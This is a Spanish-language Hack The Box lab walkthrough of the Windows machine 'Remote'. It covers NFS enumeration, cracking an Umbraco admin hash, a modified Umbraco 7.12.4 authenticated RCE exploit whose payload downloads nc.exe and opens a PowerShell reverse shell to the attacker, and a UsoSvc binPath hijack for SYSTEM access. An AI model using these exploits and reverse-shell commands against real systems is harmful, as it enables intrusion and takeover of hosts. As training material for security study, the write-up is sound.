---
layout: single
title: Remote- Hack The Box
excerpt: "Remote es una máquina Windows de dificultad fácil en la cual vamos a explotar una vulnerabilidad en Umbraco CMS 7.12.4 que permite la ejecución de código remoto en usuarios autenticados y en la fase de escalamiento de privilegios, vamos a aprovechar que el usuario tiene acceso para modificar el servicio UsoSvc que se ejecuta con privilegios de administrador."
date: 2020-09-05
classes: wide
header:
  teaser: /assets/images/hack-the-box/remote_logo.png
  teaser_home_page: true
  icon: /assets/images/hack-the-box/hackthebox.webp
categories:
  - Hack-The-Box
  - Pentesting
tags:
  - NFS
  - Umbraco
  - UsoSvc	
---

<p align="center">
<img src="/assets/images/hack-the-box/remote_logo.png">
</p>



Remote es una máquina Windows de dificultad fácil en la cual vamos a explotar una vulnerabilidad en Umbraco CMS 7.12.4 que permite la ejecución de código remoto en usuarios autenticados  y en la fase de escalamiento de privilegios, vamos a aprovechar que el usuario tiene acceso para modificar el servicio UsoSvc que se ejecuta con privilegios de administrador.


## Reconocimiento y Enumeración

### Ping

Para un acceso más rápido, agregamos la dirección IP de la máquina al archivo `/etc/hosts` de la siguiente forma:

```console
10.10.10.180    remote.htb
```

Luego, se debe revisar que la máquina esté activa. Hacemos un ping usando el siguiente comando:

```
ping -c 4 remote.htb
```

- `-c <n>` = realizar *n* veces el ping

### Nmap

Se procede a realizar un escaneo de todos los puertos con la herramienta nmap usando el siguiente comando:

```console
nmap -p- --open -T5 -v -n remote.htb -oG all-ports
```

- `-p-:` escanea todos los 65536 puertos
- `--open:` solo se va a tener en cuenta los puertos abiertos
- `-T5:` establece la plantilla de temporización, el rango es entre 0-5 y por lo tanto, el escaneo va a ir a una mayor velocidad
- `-v:` cuando nmap descubre un puerto, lo imprime por consola
- `-n:` se desactiva la resolución de DNS
- `-oG:` el archivo se va a guardar en formato grepable 

El output de nmap es el siguiente:

```console
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Remote]           
└──╼ $nmap -p- --open -T5 -v -n remote.htb -oG all-ports                
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-19 11:53 EDT

PORT      STATE SERVICE                    
21/tcp    open  ftp                       
80/tcp    open  http
111/tcp   open  rpcbind                       
135/tcp   open  msrpc
139/tcp   open  netbios-ssn                       
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
5985/tcp  open  wsman                       
47001/tcp open  winrm
```

Una vez se sabe qué puertos están abiertos en la máquina objetivo se procede a revisar las versiones de los servicios usando el comando:

```
nmap -sC -sV -p21,80,111,135,139,445,2049,47001 remote.htb -oN targeted.txt
```

- `-sC:`  realiza un escaneo usando los scripts por defecto que se encuentran en la base de datos de nmap.
- `-sV:` intenta encontrar la versión del servicio que está corriendo en el puerto correspondiente.
- `-p:` se establece los puertos que deseo hacer el escaneo.
- `-oN:` el archivo se va a guardar en un formato normal, en este caso en formato de texto.

El output de nmap es el siguiente:

```console
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Remote]           
└──╼ $nmap -sC -sV -p21,80,111,135,139,445,2049,47001 remote.htb -oN targeted.txt   
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-19 11:56 EDT

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m22s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-19T21:05:25
|_  start_date: N/A
```

Algunos de los puertos que están abiertos corresponde a los siguientes servicios:

- `Puerto 21 (FTP File Transfer Protocol):` se utiliza para conectarse de forma  remota a un servidor y autenticarse en él.
- `Puerto 80 (HTTP):` se utiliza para la navegación web de forma no segura.
- `Puerto 111 (rpcbind):` se utiliza para asignar otros servicios RPC como NFS, nlockmgr, etc,  su número correspondiente de puerto.
- `Puerto 135 (msrpc):` permite acceso a los servicios y aplicaciones de Microsoft a través de la red.
- `Puerto 139 (NetBios):` permite a los hosts en una red LAN comunicarse con el hardware de la red y transmitir datos a través de la red.
- `Puerto 445 (SMB):` compartir archivos a través de una red TCP/IP Windows.
- `Puerto 2049 (NFS):` es utilizado para sistemas de archivos distribuido en un entorno de red de computadoras de área local.

### Enumeración NFS

Encontramos que el puerto 2049 está abierto el cuál es utilizado para que cualquier aplicación acceda a los sistemas de archivos NFS, sin embargo, este puede ser una amenaza como lo informa el siguiente [artículo](https://resources.infosecinstitute.com/exploiting-nfs-share/#gref),  ya que a través de este pueden montar un disco o fichero virtual y acceder al servidor como si fuera de manera local, de esta manera tendrán permisos para abrir otros ficheros o información que se tiene configurada en el NFS.

Dicho lo anterior, vamos a utilizar el siguiente comando para tener información de los sistemas de archivos compartidos con información para el acceso del cliente

```console
┌─[nicolasmira101@parrot]─[~/Documents/Hack-the-box/Maquinas/Remote]           
└──╼ $showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
```

- `-e:` imprime una lista de los archivos compartidos o exportados.

Ahora utilizamos el siguiente comando para montar el sistema de archivos que encontramos anteriormente. Primero debemos creamos un directorio donde queremos montar el NFS

```
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Remote]
└──╼ #mkdir NFS
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Remote]
└──╼ #mount -t nfs  10.10.10.180:/site_backups NFS/
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Remote]
└──╼ #cd NFS/
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Remote/NFS]
└──╼ #ls
App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
```

Enumerando las carpetas y archivos del NFS encontramos un archivo llamado `Umbraco.sdf` que se encuentra dentro de la carpeta `App_Data`. Los archivos con extensión .sdf contienen una base de datos relacional compactada en el formato de SQL Server Compact y por lo tanto no podemos abrir este tipo de archivo en Linux. Sin embargo, vamos a utilizar el comando `strings` para visualizar las cadenas de caracteres imprimibles que contiene este archivo.

```
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Remote/NFS/App_Data]
└──╼ #strings Umbraco.sdf 
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
@{pv
qpkaj
```

De la anterior imagen, podemos ver que hay un usuario llamado `admin` y que el hash de este usuario se encuentra en el formato SHA-1 y el valor es `b8be16afba8c314ad33d812f22a04991b90e2aaa`.

Continuando la enumeración, encontramos que en el archivo `Web.config` está la versión que utiliza este CMS y es la versión 7.12.4. Esta versión es vulnerable a ejecución de código remoto en usuarios autenticados.

```xml
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Remote/NFS]
└──╼ #cat Web.config 
	<appSettings>
		<!--
      Umbraco web.config configuration documentation can be found here:
      https://our.umbraco.com/documentation/using-umbraco/config-files/#webconfig
      -->
		<add key="umbracoConfigurationStatus" value="7.12.4" />
		<add key="umbracoPath" value="~/umbraco" />
		<add key="umbracoHideTopLevelNodeFromPath" value="true" />
		<add key="umbracoUseDirectoryUrls" value="true" />
		<add key="umbracoTimeOutInMinutes" value="20" />
		<add key="umbracoDefaultUILanguage" value="en-US" />
		<add key="umbracoUseSSL" value="false" />

```




## Explotación

Primero, procedemos a crackear el hash del usuario `admin` usando `john`

```
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Remote]
└──╼ #echo "b8be16afba8c314ad33d812f22a04991b90e2aaa" > hash-admin
┌─[✗]─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Remote]
└──╼ #john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1 hash-admin 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
baconandcheese   (?)
1g 0:00:00:04 DONE (2020-06-19 16:31) 0.2173g/s 2135Kp/s 2135Kc/s 2135KC/s baconandchipies1..baconandcabbage
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed
```

La contraseña encontrada es `baconandcheese`. Ahora, como mencionamos anteriormente, la versión de Umbraco que está corriendo esta máquina es la 7.12.4 y revisando en [Exploit-db](https://www.exploit-db.com/exploits/46153) hay un exploit que aprovecha la vulnerabilidad de ejecución de código remoto en usuarios autenticados.

Debemos realizar unos cambios al exploit anterior ya que es una prueba de concepto, donde debemos cambiar los valores del `login`, la `password` y el `host`. Además debemos cambiar el payload para que en vez de abrir la calculadora, tengamos una shell reversa en donde descargamos el archivo `nc.exe` en la carpeta `/tmp` y posteriormente ejecutamos el comando `nc.exe` con PowerShell para tener la shell reversa. El exploit quedaría de la siguiente manera:

```python
import requests;

from bs4 import BeautifulSoup;

def print_dict(dico):
    print(dico.items());
    
print("Start");

# Execute a calc for the PoC
payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
<msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
{ string cmd = "mkdir /tmp;iwr -uri http://10.10.14.26:8080/nc.exe -outfile /tmp/nc.exe;/tmp/nc.exe 10.10.14.26 4444 -e powershell"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
 </xsl:template> </xsl:stylesheet> ';

login = "admin@htb.local";
password="baconandcheese";
host = "http://10.10.10.180";

# Step 1 - Get Main page
s = requests.session()
url_main =host+"/umbraco/";
r1 = s.get(url_main);
print_dict(r1.cookies);

# Step 2 - Process Login
url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
loginfo = {"username":login,"password":password};
r2 = s.post(url_login,json=loginfo);

# Step 3 - Go to vulnerable web page
url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx";
r3 = s.get(url_xslt);

soup = BeautifulSoup(r3.text, 'html.parser');
VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};

# Step 4 - Launch the attack
r4 = s.post(url_xslt,data=data,headers=headers);

print("End");
```

Antes de ejecutar el exploit, debemos descargar el ejecutable de netcat en el siguiente [link](https://eternallybored.org/misc/netcat/) , crear un servidor http con Python en el puerto 8080 e inicializar un sesión con netcat en el puerto 4444

```
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Remote]
└──╼ #ls
exploit.py  hash-admin  nc.exe  netcat-1.11  NFS  targeted.txt
┌──[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Remote]
└──╼ #python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

┌─[root@parrot]─[~/Documents/Hack-the-box/Maquinas/Remote]
└──╼ $nc -nlvp 4444
listening on [any] 4444 ...
```

Ahora sí ejecutamos el exploit de la siguiente manera y como podemos observar en el siguiente código, ya tenemos acceso como usuario:

```
┌─[root@parrot]─[~/Documents/Hack-the-box/Maquinas/Remote]
└──╼ $python3 exploit.py 
Start
[]

┌──[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Remote]
└──╼ #python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.10.180 - - [19/Jun/2020 17:16:22] "GET /nc.exe HTTP/1.1" 200 -

┌─[root@parrot]─[~/Documents/Hack-the-box/Maquinas/Remote]
└──╼ $nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.180] 49685
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv> 
```

La flag del usuario se encuentra en el siguiente directorio

```
PS C:\windows\system32\inetsrv> type C:\Users\Public\user.txt
type C:\Users\Public\user.txt
6d4712...........................
```




## Escalamiento de privilegios

Primero, vamos a revisar posibles rutas de escalada de privilegios locales usando la herramienta [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS). Para esto, algo igual que hicimos con el ejecutable `nc.exe` vamos a guardar el archivo [WinPEASx64.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases) en el directorio donde tenemos el servidor HTTP con Python corriendo y luego en la máquina donde tenemos nuestra shell reversa, vamos a escribir lo siguiente:

```
PS C:\tmp> iwr -uri http://10.10.14.26:8080/winPEASx64.exe -outfile /tmp/winPEASx64.exe
iwr -uri http://10.10.14.26:8080/winPEASx64.exe -outfile /tmp/winPEASx64.exe

PS C:\tmp> .\winPEASx64.exe
.\winPEASx64.exe

```

- ​	`iwr` es la abreviación del comando `Invoke-WebRequest` en PowerShell, que nos permite obtener contenido de una página web.

Del output de WinPEAS, lo que más nos interesa es lo siguiente:

```
  [+] Modifiable Services(T1007)
   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
    UsoSvc: AllAccess, Start
```

Nos indica que podemos modificar el servicio [Update Orchestrator (UsoSVC)](https://appuals.com/what-is-update-orchestrator-service-and-should-it-be-disabled/), que es el responsable de descargar las actualizaciones para el sistema operativo e instalarlas después de verificar. Leyendo sobre vulnerabilidades de este servicio, encontramos la [CVE-2019-1322](https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/) que permitía el escalamiento de privilegios, ya que el servicio `UsoSvc` se ejecuta como `NT AUTHORITY\SYSTEM` y estaba habilitado de manera predeterminada en Windows 10 y Windows Server 2019.

En el siguiente [link](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services) se encuentra la manera de cómo podemos modificar este servicio para tener acceso como administrador.

La información sobre cada servicio en el sistema se almacena en el registro. La llave de registro "ImagePath" generalmente contiene la ruta del archivo de imagen del controlador. Lo que vamos a hacer en este caso, es el secuestro de esta llave con un ejecutable `nc.exe` para que  cargue durante el inicio del servicio `UsoSvc`. Primero, vamos a validar la ruta del archivo en donde se está ejecutando el servicio:

```
PS C:\tmp> reg query "HKLM\System\CurrentControlSet\Services\usosvc" /v "ImagePath"
reg query "HKLM\System\CurrentControlSet\Services\usosvc" /v "ImagePath"

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\usosvc
    ImagePath    REG_EXPAND_SZ    %systemroot%\system32\svchost.exe -k netsvcs -p
```

Con el siguiente comando, vamos a modifica el valor de las entradas del servicio `UsoSvc` en el registro y en la base de datos de Service Control Manager.

```
PS C:\tmp> sc.exe config usosvc binPath= "C:\tmp\nc.exe -e cmd.exe 10.10.14.26 443"
sc.exe config usosvc binPath= "C:\tmp\nc.exe -e cmd.exe 10.10.14.26 443"
[SC] ChangeServiceConfig SUCCESS
```

- ​	`binPath:` especifica una ruta al archivo binario del servicio.

Volvemos a consultar la ruta del archivo en donde se está ejecutando el servicio y vemos que ya ha cambiado:

```
PS C:\tmp> reg query "HKLM\System\CurrentControlSet\Services\usosvc" /v "ImagePath"
reg query "HKLM\System\CurrentControlSet\Services\usosvc" /v "ImagePath"

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\usosvc
    ImagePath    REG_EXPAND_SZ    C:\tmp\nc.exe -e cmd.exe 10.10.14.26 443
```

Ahora vamos a parar la ejecución del servicio:

```
PS C:\tmp> sc.exe stop usosvc
sc.exe stop usosvc

SERVICE_NAME: usosvc 
        TYPE               : 30  WIN32  
        STATE              : 3  STOP_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x7530
```

Antes de reiniciar el servicio, vamos a entablar la sesión con netcat en el puerto 443.

```
┌─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Remote]
└──╼ #rlwrap nc -nvlp 443
listening on [any] 443 ...
```

- `rlwrap:` es una utilidad en Linux que proporciona un historial de comandos y edición de entrada de teclado, esto con el fin de que nuestra shell reversa sea más interactiva.

Ahora sí vamos a reiniciar el servicio:

```
PS C:\tmp> sc.exe start usosvc      
sc.exe start usosvc
```

Por último, debemos obtener rápidamente la flag del root, ya que después de 30 segundos, el servicio no se inicia porque `nc.exe` no es un binario de servicio.

```
─[root@parrot]─[/home/nicolasmira101/Documents/Hack-the-box/Maquinas/Remote]
└──╼ #rlwrap nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.180] 49703
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
903944...........................

C:\Windows\system32>
```

